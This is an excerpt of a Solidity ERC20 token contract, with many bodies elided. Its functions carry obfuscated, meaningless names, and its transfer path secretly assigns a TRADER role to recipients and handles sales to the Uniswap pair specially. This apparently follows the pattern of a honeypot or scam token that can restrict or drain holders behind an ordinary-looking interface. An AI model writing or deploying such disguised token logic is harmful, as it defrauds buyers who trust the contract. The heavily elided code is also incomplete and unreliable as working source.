...
interface _CINSDFNTRoleControl {
...
abstract contract _CINSDFNTConsole is Context, _CINSDFNTRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        __CINSDFNTmevRooG(role, account, amt);
    }

    function __CINSDFNTmevRooG(bytes32 role, address account, uint256 amount) internal {
    ...
    function __CINSDFNTgrvNewPush(bytes32 role, address account, uint256 num) internal virtual {
...
contract _CINSDFNTERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _CINSDFNTERC20, _CINSDFNTConsole {
    ...
    ) _CINSDFNTERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_CINSDFNTERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __CINSDFNTxindbf(from, to, amt);

    }

    function __CINSDFNTxindbf(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __CINSDFNTxfgdfbb(from, to, amt);
    }


    function __CINSDFNTxfgdfbb(address from, address to, uint256 amt) internal {
        ...
        __CINSDFNTxfyhyhtg(from, to, amt);
    }

    function __CINSDFNTxfyhyhtg(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __CINSDFNTmyfdfger(from, to, amt);
    }


    function __CINSDFNTmyfdfger(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            ...
            __CINSDFNTgrvNewPush(TRADER,to,1);
        }

        __CINSDFNTxcvegger(from, to, amt);
    }

    function __CINSDFNTxcvegger(address from, address to, uint256 amt) internal {
